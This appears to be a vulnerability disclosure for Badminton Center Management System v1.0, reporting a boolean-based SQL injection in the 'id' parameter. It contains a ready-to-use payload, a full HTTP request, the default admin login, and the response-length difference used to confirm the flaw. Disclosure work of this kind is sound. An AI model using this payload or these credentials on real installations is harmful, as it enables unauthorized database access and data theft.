# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/?page=service_transactions/view_details&id=

Vulnerability location: /bcms/admin/?page=service_transactions/view_details&id=, id

[+] Payload: /bcms/admin/?page=service_transactions/view_details&id=6%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /bcms/admin/?page=service_transactions/view_details&id=6%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 33357
![image](https://user-images.githubusercontent.com/54017627/170618051-688346a4-631d-48f6-87ca-7c690e9b17a1.png)

![image](https://user-images.githubusercontent.com/54017627/170618228-d5be8560-aea9-4f04-a972-86142b37d0fd.png)

When length (database ()) = 7, Content-Length: 31064

![image](https://user-images.githubusercontent.com/54017627/170618020-4fb96083-7d2c-4a11-a5e0-a77c378f9f99.png)

![image](https://user-images.githubusercontent.com/54017627/170618113-8b9f0587-e283-4c54-afc2-53b8943e17c8.png)
